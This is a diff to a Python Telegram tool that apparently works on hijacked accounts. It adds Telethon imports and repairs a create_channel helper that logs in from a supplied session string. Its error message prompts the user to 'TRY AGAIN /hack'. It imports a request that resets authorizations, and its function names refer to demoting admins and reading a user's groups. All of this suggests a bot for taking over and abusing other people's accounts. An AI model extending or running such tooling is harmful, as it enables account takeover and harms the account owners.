@@ -17,6 +17,10 @@ from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions as ok
 from pyrogram.types import ChatPrivileges
 from telethon.tl.types import ChannelParticipantsAdmins
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from telethon.tl.functions.channels import CreateChannel
+
 
 async def users_gc(session):
     err = ""
@@ -363,18 +367,16 @@ async def demote_all(session,gc_id):
 
 
 async def create_channel(session, channel_name):
-    err = ""
     try:
         client = TelegramClient(StringSession(session), API_ID, API_HASH)
         await client.connect()
         result = await client(CreateChannel(
             title=channel_name,
             about="Channel For Us",
-            megagroup=False 
+            megagroup=False
+        ))
         channel = result.chats[0]
         await client.disconnect()
         return channel.username if channel.username else "No username set"
     except Exception as e:
-        err = str(e)
-        return f"**ERROR:** {err}\n**TRY AGAIN /hack.**"
-         
+        return f"**ERROR:** {str(e)}\n**TRY AGAIN /hack.**"
